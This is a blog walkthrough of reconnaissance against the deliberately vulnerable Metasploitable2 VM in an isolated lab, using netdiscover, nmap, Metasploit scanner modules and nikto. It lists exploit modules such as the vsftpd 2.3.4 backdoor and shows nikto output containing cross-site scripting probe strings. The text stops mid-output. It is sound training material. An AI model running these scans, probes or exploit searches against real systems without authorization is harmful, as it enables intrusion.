---
author: Kush, Nishchal
date: '2018-07-27T23:23:09+10:00'
draft: false
tags:
- metasploit
- metasploitable
- metasploitable2
- virtualbox
- vboxmanage
- nmap
- db_nmap
title: Metasploitable2 Walkthrough
---

For this walk-though I use the Metasploit framework to attempt to perform a penetration testing exercise on Metasploitable 2. I employ the following penetration testing phases: reconnaisance, threat modelling and vulnerability identification, and exploitation. Since this is a mock exercise, I leave out the pre-engagement, post-exploitation and risk analysis, and reporting phases.

# Set-up
This metasploitable walk-through is performed in a virtual lab environment. Two virtual machines (VMs) are used. The first is a Kali VM and the second is the Metasploitable2 VM. Both VMs have their network interfaces connected to an internal Virtualbox network called vlabnet. There is a DHCP server on the virtual lab network to dynamically allocate IP addresses to hosts.

The following command may be used to setup the DHCP server. `VBoxManage dhcpserver add --netname vlabnet --ip 10.10.10.1 --netmask 255.255.255.0 --lowerip 10.10.10.100 --upperip 10.10.10.149 --enable`

To verify that the DHCP server is available for the internal network, run `VBoxManage.exe list dhcpservers`, which should list the DHCP servers available for the respective networks.

So the walk-through is just me pretending to apply some arbitraty penetration testing approaches to the Metasploitable2 VM.

Also to make it easier to copy and mast between the Kali VM and the host machine to run Internet searched, it may be useful to install Virtualbox Guest Additions and share the clipboard.

```
apt-get autoremove --purge
apt-get update
apt-get dist-upgrade
reboot
apt-get update
apt-get install -y virtualbox-guest-x11
reboot
```

## Metasploitable2

Download the current version of metasploitable 2 from the repository
`https://sourceforge.net/projects/metasploitable/`. Extract the archive and
locate the contents of the Metasploitable2-Linux directory. We will need these
files to create a virtual machine within VirtualBox.

Create a new virtual machine in VirtualBox. You can review the contents of the
`.vmx` file to get the system specification, but I have summarised below for
reference.

```
VM: Metasploitable2-Linux
OS: Ubuntu
CPU:  1 (max: 4)
RAM:  512MB
eth0: 00:0C:29:FA:DD:2A (nat)
eth1: 00:0C:29:FA:DD:34 (host only)
Desc: This is Metasploitable2 (Linux)|0A|0AMetasploitable is an intentionally vulnerable Linux virtual machine. This VM can be used to conduct security training, test security tools, and practice common penetration testing techniques. |0A|0AThe default login and password is msfadmin:msfadmin. |0A|0ANever expose this VM to an untrusted network (use NAT or Host-only mode if you have any questions what that means). |0A|0ATo contact the developers, please send email to msfdev@metasploit.com|0A|0A
```

I disconnected the second interface (eth1), and connected the first interface
(eth0) to an internal network (intnet).

## Preparation

First, attempt to identify the target. We use the netdiscover utility to identify the hosts on the network. Since the eth1 interface on the Kali VM is connected to the vlannet, and we know that the subnet for that interface is 10.10.10.0/24, we can run the following command

```
root@kali:~# netdiscover -i eth1 -r 10.10.10.0/24 -P
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.10.10.1      08:00:27:ed:13:e7      1      60  PCS Systemtechnik GmbH
 10.10.10.101    00:0c:29:fa:dd:2a      1      60  VMware, Inc.

-- Active scan completed, 2 Hosts found.
root@kali:~# 
```

Since we used the `-P` switch netdiscover produces a parsable output. We can thus grep this to only get IP addresses, e.g. `netdiscover -i eth1 -r 10.10.10.0/24 -P | grep -o -E '([0-9]{1,3}\.){3}[0-9]{1,3}'`. From the output we can identify two hosts. We know that 10.10.10.1 is the DHCP server, so the other IP must belong to the target, i.e. the Metasploitable2 host. We can further refine the command to exclude the DHCP server, e.g. `netdiscover -i eth1 -r 10.10.10.0/24 -P | grep -o -E '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v -E '10\.10\.10\.1$'`. We can now proceed further to identify services running on that host using a port scanner such as nmap.

The previous command does not have to be processed so much, but it does provide an output that can be used in scripts in future. Next we scan all ports on the target host using the command `nmap -Pn -n -sV -vv -p1-65535 --open 10.10.10.101`. We get a result listing all open ports and the service versions.

```
root@kali:~# nmap -Pn -n -sV -vv -p1-65535 --open 10.10.10.101
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-27 10:38 EDT
NSE: Loaded 43 scripts for scanning.
Initiating ARP Ping Scan at 10:38
Scanning 10.10.10.101 [1 port]
Completed ARP Ping Scan at 10:38, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:38
Scanning 10.10.10.101 [65535 ports]
Discovered open port 80/tcp on 10.10.10.101
Discovered open port 25/tcp on 10.10.10.101
Discovered open port 23/tcp on 10.10.10.101
Discovered open port 139/tcp on 10.10.10.101
Discovered open port 22/tcp on 10.10.10.101
Discovered open port 5900/tcp on 10.10.10.101
Discovered open port 445/tcp on 10.10.10.101
Discovered open port 111/tcp on 10.10.10.101
Discovered open port 53/tcp on 10.10.10.101
Discovered open port 3306/tcp on 10.10.10.101
Discovered open port 21/tcp on 10.10.10.101
Discovered open port 2121/tcp on 10.10.10.101
Discovered open port 51622/tcp on 10.10.10.101
Discovered open port 47474/tcp on 10.10.10.101
Discovered open port 6697/tcp on 10.10.10.101
Discovered open port 34009/tcp on 10.10.10.101
Discovered open port 8180/tcp on 10.10.10.101
Discovered open port 514/tcp on 10.10.10.101
Discovered open port 6667/tcp on 10.10.10.101
Discovered open port 513/tcp on 10.10.10.101
Discovered open port 8009/tcp on 10.10.10.101
Discovered open port 3632/tcp on 10.10.10.101
Discovered open port 8787/tcp on 10.10.10.101
Discovered open port 35709/tcp on 10.10.10.101
Discovered open port 512/tcp on 10.10.10.101
Discovered open port 6000/tcp on 10.10.10.101
Discovered open port 5432/tcp on 10.10.10.101
Discovered open port 1099/tcp on 10.10.10.101
Discovered open port 2049/tcp on 10.10.10.101
Completed SYN Stealth Scan at 10:39, 7.93s elapsed (65535 total ports)
Initiating Service scan at 10:39
Scanning 30 services on 10.10.10.101
Completed Service scan at 10:41, 121.45s elapsed (30 services on 1 host)
NSE: Script scanning 10.10.10.101.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:41
Completed NSE at 10:41, 0.26s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:41
Completed NSE at 10:41, 0.07s elapsed
Nmap scan report for 10.10.10.101
Host is up, received arp-response (0.00052s latency).
Scanned at 2018-07-27 10:38:59 EDT for 130s
Not shown: 65505 closed ports
Reason: 65505 resets
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 64 vsftpd 2.3.4
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      syn-ack ttl 64 Linux telnetd
25/tcp    open  smtp        syn-ack ttl 64 Postfix smtpd
53/tcp    open  domain      syn-ack ttl 64 ISC BIND 9.4.2
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        syn-ack ttl 64 netkit-rsh rexecd
513/tcp   open  login       syn-ack ttl 64
514/tcp   open  shell       syn-ack ttl 64 Netkit rshd
1099/tcp  open  rmiregistry syn-ack ttl 64 GNU Classpath grmiregistry
2049/tcp  open  nfs         syn-ack ttl 64 2-4 (RPC #100003)
2121/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.3.1
3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     syn-ack ttl 64 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  syn-ack ttl 64 PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         syn-ack ttl 64 VNC (protocol 3.3)
6000/tcp  open  X11         syn-ack ttl 64 (access denied)
6667/tcp  open  irc         syn-ack ttl 64 UnrealIRCd
6697/tcp  open  irc         syn-ack ttl 64 UnrealIRCd
8009/tcp  open  ajp13       syn-ack ttl 64 Apache Jserv (Protocol v1.3)
8180/tcp  open  http        syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         syn-ack ttl 64 Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
34009/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
35709/tcp open  rmiregistry syn-ack ttl 64 GNU Classpath grmiregistry
47474/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)
51622/tcp open  nlockmgr    syn-ack ttl 64 1-4 (RPC #100021)
MAC Address: 00:0C:29:FA:DD:2A (VMware)
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.77 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.622MB)
root@kali:~# 
```

The remainder of the walk-through just works through exploiting each of the service(s) related witht he open ports. To start the Metasploit console issue the `msfconsole` command. However, we need to conver off some important metasploit features: 

### Metasploit Database

Although it’s not required, it is pretty useful to store details from metasploit into a database for ease of access and to make results persistent so that session continuity can be maintained. Firstly create a Postgres database and user to be used by the Metasploit framework. In the example below we create a user called msf_user and a database called msf_database.

```
# systemctl start postgresql
# su postgres
$ createuser --interactive msf_user -P
Enter password for new role: 
Enter it again: 
Shall the new role be a superuser? (y/n) n
Shall the new role be allowed to create databases? (y/n) n
Shall the new role be allowed to create more new roles? (y/n) n
$ createdb --owner=msf_user msf_database
$ exit
```

Once the database has been created, start the Metasploit console and connect to the database using the details from the previous step. Once connected use the db_status command to verify connectivity to the database
```
db_connect msf_user:[PASSWORD]@127.0.0.1:5432/msf_database
```
There a a number of commands which make things a bit easier to manager from within the metasploit console, such as db_nmap for nmap scans and storing results in the database. For a full list of commands issue the help database command to see whats available.

### Metasploit Workspaces

Once in the Metasploit msfconsole, Metasploit workspaces allow for logical separation of hosts and related data. This is useful for managing multiple projects and/or engagements. For this example we create a workspace called ‘metasploitable2’ using the `workspace -a metasploitable2`

# Reconaisane

After setting up the database and a separate workspace for the walk-through we work within the msfconsole to performance reconaisance on the target. Firstly we attempt to identify the services running on the target, so we use the db_nmap command. `db_nmap -A -p1-65535 -vv 10.10.10.101`. The command populates the services versions which may be queried using the services command.  

Now we know all the open ports on the target Metasploitable 2 host, as well as the versions of the services running based on the nmap scan, we can proceed to the next phase to identifiy vulnerabilities in the services

I like using exploitdb (https://www.exploit-db.com/) for identifying vulnerabilities, this is available on the command line in Kali using searchsploit. However to get more details on the vulnerabilities and exploits it may be useful to have the full writeups available via the associated papers (see, https://github.com/offensive-security/exploit-database-papers). This can be using using the following command, however you should note that its approximately a 2GB download.

```
apt-get install -y exploitdb-papers
```

## Threat Modelling and Vulnerability Identification

Vulnerability identification is pretty simple with metasploit. We can search for known exploits based on the service details. For this section, we essentially iterate through the list of active services and search for known exploits or vulnerabilities. For the purposes of prevenity we don’t show each service vulnerability identification.

## Port 21

```
msf > search vsftpd 2.3.4

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   auxiliary/gather/teamtalk_creds                        normal     TeamTalk Gather Credentials
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution


msf > info exploit/unix/ftp/vsftpd_234_backdoor

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03
<snip>
```

## Port 22

Could not find anything specific to the version of openssh within Metasploit, so searched for CVEs regarding this. Found <https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-169731/Openbsd-Openssh-4.7p1.html>, but nothing for which I could find an exploit at this stage.  

Kept searching for vunerabilities and exploits against SSH and came across https://github.com/g0tmi1k/debian-ssh

## Port 25

```
msf > db_nmap -A -p 25 10.10.10.101
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 13:12 EDT
[*] Nmap: Nmap scan report for 10.10.10.101
[*] Nmap: Host is up (0.00087s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 25/tcp open  smtp    Postfix smtpd
[*] Nmap: |_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
[*] Nmap: | ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
[*] Nmap: | Not valid before: 2010-03-17T14:07:45
[*] Nmap: |_Not valid after:  2010-04-16T14:07:45
[*] Nmap: |_ssl-date: 2018-07-28T17:26:53+00:00; +14m31s from scanner time.
[*] Nmap: | sslv2:
[*] Nmap: |   SSLv2 supported
[*] Nmap: |   ciphers:
[*] Nmap: |     SSL2_RC4_128_WITH_MD5
[*] Nmap: |     SSL2_RC2_128_CBC_WITH_MD5
[*] Nmap: |     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
[*] Nmap: |     SSL2_RC4_128_EXPORT40_WITH_MD5
[*] Nmap: |     SSL2_DES_192_EDE3_CBC_WITH_MD5
[*] Nmap: |_    SSL2_DES_64_CBC_WITH_MD5
[*] Nmap: MAC Address: 00:0C:29:FA:DD:2A (VMware)
[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 2.6.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:2.6
[*] Nmap: OS details: Linux 2.6.9 - 2.6.33
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: Host:  metasploitable.localdomain
[*] Nmap: Host script results:
[*] Nmap: |_clock-skew: mean: 14m30s, deviation: 0s, median: 14m30s
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.87 ms 10.10.10.101
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds
msf > 
```

From the nmap scan we can see that the VRFY SMTP method is supported. We can exploit this to enumerate the users. See https://cr.yp.to/smtp/vrfy.html. We append the users into our users file called msfusers.txt

## Port 53

Searched for vulnerabilities affecting bind 9.4.2, found https://www.cvedetails.com/vulnerability-list/vendor_id-64/product_id-144/version_id-51374/ISC-Bind-9.4.2.html.

## Port 80

```
msf > db_nmap -A -p 80 10.10.10.101
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 15:55 EDT
[*] Nmap: Nmap scan report for 10.10.10.101
[*] Nmap: Host is up (0.00078s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
[*] Nmap: |_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
[*] Nmap: |_http-title: Metasploitable2 - Linux
[*] Nmap: MAC Address: 00:0C:29:FA:DD:2A (VMware)
[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 2.6.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:2.6
[*] Nmap: OS details: Linux 2.6.9 - 2.6.33
[*] Nmap: Network Distance: 1 hop
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.78 ms 10.10.10.101
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds
msf > use auxiliary/scanner/http/dir_listing
msf auxiliary(scanner/http/dir_listing) > show options

Module options (auxiliary/scanner/http/dir_listing):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       The path to identify directoy listing
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.101/32  yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  256              yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf auxiliary(scanner/http/dir_listing) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/dir_listing) > use auxiliary/scanner/http/dir_scanner 
msf auxiliary(scanner/http/dir_scanner) > show options

Module options (auxiliary/scanner/http/dir_scanner):

   Name        Current Setting                                          Required  Description
   ----        ---------------                                          --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
   PATH        /                                                        yes       The path  to identify files
   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.101/32                                          yes       The target address range or CIDR identifier
   RPORT       80                                                       yes       The target port (TCP)
   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
   THREADS     256                                                      yes       The number of concurrent threads
   VHOST                                                                no        HTTP server virtual host

msf auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 10.10.10.101
[+] Found http://10.10.10.101:80/cgi-bin/ 404 (10.10.10.101)
[+] Found http://10.10.10.101:80/doc/ 200 (10.10.10.101)
[+] Found http://10.10.10.101:80/icons/ 404 (10.10.10.101)
[+] Found http://10.10.10.101:80/index/ 200 (10.10.10.101)
[+] Found http://10.10.10.101:80/phpMyAdmin/ 200 (10.10.10.101)
[+] Found http://10.10.10.101:80/test/ 404 (10.10.10.101)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/dir_scanner) > use auxiliary/scanner/http/files_dir
msf auxiliary(scanner/http/files_dir) > show options

Module options (auxiliary/scanner/http/files_dir):

   Name        Current Setting                                           Required  Description
   ----        ---------------                                           --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_files.txt  no        Path of word dictionary to use
   EXT                                                                   no        Append file extension to use
   PATH        /                                                         yes       The path  to identify files
   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.101/32                                           yes       The target address range or CIDR identifier
   RPORT       80                                                        yes       The target port (TCP)
   SSL         false                                                     no        Negotiate SSL/TLS for outgoing connections
   THREADS     256                                                       yes       The number of concurrent threads
   VHOST                                                                 no        HTTP server virtual host

msf auxiliary(scanner/http/files_dir) > run

[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[*] Using code '404' as not found for files with extension .cfg
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[+] Found http://10.10.10.101:80/index.php 200
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension 
[+] Found http://10.10.10.101:80/dav 301
[+] Found http://10.10.10.101:80/index 200
[+] Found http://10.10.10.101:80/phpMyAdmin 301
[+] Found http://10.10.10.101:80/test 301
[*] Using code '404' as not found for files with extension 
[+] Found http://10.10.10.101:80/dav 301
[+] Found http://10.10.10.101:80/index 200
[+] Found http://10.10.10.101:80/phpMyAdmin 301
[+] Found http://10.10.10.101:80/test 301
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/files_dir) > use auxiliary/scanner/http/robots_txt 
msf auxiliary(scanner/http/robots_txt) > show options

Module options (auxiliary/scanner/http/robots_txt):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       The test path to find robots.txt file
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.101/32  yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  256              yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf auxiliary(scanner/http/robots_txt) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/robots_txt) >
```

Based on the recon, we have found the following URLs

  * http://10.10.10.101:80/cgi-bin/
  * http://10.10.10.101:80/dav
  * http://10.10.10.101:80/doc/
  * http://10.10.10.101:80/icons/
  * http://10.10.10.101:80/index/
  * http://10.10.10.101:80/phpMyAdmin/
  * http://10.10.10.101:80/test/

Searched online for CVE relating to Apache 2.2.8 and found https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-77221/Apache-Http-Server-2.2.8.html and https://httpd.apache.org/security/vulnerabilities_22.html. Decided to run another vulnerability scan using nikto

```
root@kali:~# nikto -h 10.10.10.101
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.101
+ Target Hostname:    10.10.10.101
+ Target Port:        80
+ Start Time:         2018-07-28 18:01:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Output from the phpinfo() function was found.
+ OSVDB-3268: /doc/: Directory indexing found.
+ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ Server leaks inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 12:24:00 2008
+ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /test/: Directory indexing found.
+ OSVDB-3092: /test/: This might be interesting...
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ /phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>: Output from the phpinfo() function was found.
+ /phpinfo.php?cx[]=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